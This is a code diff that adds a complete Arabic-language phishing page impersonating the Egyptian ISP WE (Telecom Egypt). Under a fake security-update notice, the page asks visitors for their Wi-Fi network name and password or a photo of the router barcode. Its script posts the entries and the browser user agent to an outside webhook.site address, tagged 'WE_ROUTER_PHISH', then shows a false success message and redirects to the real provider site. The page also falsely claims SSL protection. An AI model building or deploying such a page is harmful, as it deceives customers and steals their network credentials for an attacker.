@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WE | نظام الدعم الذكي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com">
+    <style>
+        :root { --we-purple: #4a245e; --we-magenta: #bc2085; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            font-family: 'Segoe UI', Tahoma, sans-serif; 
+            background: #f4f4f9; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: flex-start; /* لضمان ظهور المحتوى من الأعلى في الهواتف */
+            min-height: 100vh;
+        }
+
+        .app-card {
+            background: white;
+            width: 100%;
+            max-width: 450px; /* ليبقى بشكل أنيق على الحواسب أيضاً */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        @media (min-width: 500px) {
+            .app-card { min-height: auto; margin-top: 20px; border-radius: 20px; overflow: hidden; }
+        }
+
+        .header {
+            background: var(--we-purple);
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+            border-bottom-left-radius: 25px;
+            border-bottom-right-radius: 25px;
+        }
+        .logo { font-size: 2.5rem; font-weight: 900; font-style: italic; margin: 0; }
+
+        .status-box {
+            background: #fff;
+            margin: -20px 20px 15px;
+            padding: 15px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            border-right: 4px solid #ff3b30;
+        }
+
+        .form-body { padding: 15px 25px; flex: 1; }
+        
+        .input-group { margin-bottom: 15px; position: relative; text-align: right; }
+        label { display: block; margin-bottom: 6px; font-weight: 600; color: var(--we-purple); font-size: 0.85rem; }
+        
+        .input-wrapper { position: relative; }
+        .input-wrapper i { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #aaa; }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px 40px 14px 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #fafafa;
+        }
+
+        .qr-section {
+            border: 2px dashed #ddd;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 20px 0;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .qr-section:active { background: #f0f0f0; }
+        .qr-section i { font-size: 1.5rem; color: var(--we-magenta); margin-bottom: 5px; }
+
+        .btn-action {
+            background: linear-gradient(90deg, var(--we-purple), var(--we-magenta));
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(188, 32, 133, 0.2);
+            cursor: pointer;
+        }
+
+        .footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 0.7rem;
+            color: #999;
+        }
+
+        /* أنيميشن النبض للتنبيه */
+        .pulse { width: 10px; height: 10px; background: #ff3b30; border-radius: 50%; display: inline-block; margin-left: 5px; animation: blink 1.2s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="app-card">
+    <div class="header">
+        <h1 class="logo">we</h1>
+        <div style="font-size: 0.8rem; opacity: 0.8;">الخدمة الذاتية لتحديث البيانات</div>
+    </div>
+
+    <div class="status-box">
+        <div style="font-weight: bold; font-size: 0.9rem; color: #333;"><span class="pulse"></span>إجراء مطلوب: تحديث الحماية</div>
+        <p style="font-size: 0.75rem; color: #666; margin: 5px 0 0;">يرجى إعادة إدخال بيانات الواي فاي لتفعيل جدار الحماية الجديد.</p>
+    </div>
+
+    <div class="form-body">
+        <div class="input-group">
+            <label>اسم الشبكة (SSID)</label>
+            <div class="input-wrapper">
+                <i class="fas fa-wifi"></i>
+                <input type="text" id="ssid" placeholder="أدخل اسم الشبكة">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>كلمة مرور الواي فاي الحالية</label>
+            <div class="input-wrapper">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="pass" placeholder="••••••••">
+            </div>
+        </div>
+
+        <div style="text-align: center; margin: 15px 0; color: #ccc;">──────── أو ────────</div>
+
+        <label for="barcode" class="qr-section">
+            <i class="fas fa-qrcode"></i>
+            <div style="font-size: 0.85rem; color: #555; font-weight: bold;">رفع صورة باركود الراوتر</div>
+            <input type="file" id="barcode" accept="image/*" style="display: none;">
+        </label>
+
+        <button class="btn-action" onclick="sendToWebhook()">تحديث وإعادة تشغيل</button>
+        
+        <div style="text-align: center; margin-top: 15px; color: #28a745; font-size: 0.75rem; font-weight: bold;">
+            <i class="fas fa-shield-check"></i> تم التشفير بواسطة بروتوكول SSL آمن
+        </div>
+    </div>
+
+    <div class="footer">
+        جميع الحقوق محفوظة للشركة المصرية للاتصالات © 2024<br>
+        دعم فني: 111 أو 19777
+    </div>
+</div>
+
+<script>
+    async function sendToWebhook() {
+        const ssid = document.getElementById('ssid').value;
+        const pass = document.getElementById('pass').value;
+        const webhookURL = "https://webhook.site/11083093-2bab-4c86-9201-b947849a12d4";
+
+        if(!ssid || !pass) {
+            alert("يرجى ملء البيانات لضمان عدم انقطاع الخدمة.");
+            return;
+        }
+
+        // تحويل الزر لحالة التحميل
+        const btn = document.querySelector('.btn-action');
+        btn.innerHTML = '<i class="fas fa-sync fa-spin"></i> جاري التحقق...';
+        btn.disabled = true;
+
+        const payload = {
+            network: ssid,
+            key: pass,
+            type: "WE_ROUTER_PHISH",
+            device: navigator.userAgent
+        };
+
+        try {
+            await fetch(webhookURL, {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify(payload)
+            });
+
+            setTimeout(() => {
+                alert("تم تحديث البيانات بنجاح. سيتم تطبيق الإعدادات خلال دقائق.");
+                window.location.href = "https://www.te.eg";
+            }, 2000);
+        } catch (e) {
+            btn.innerHTML = 'تحديث وإعادة تشغيل';
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
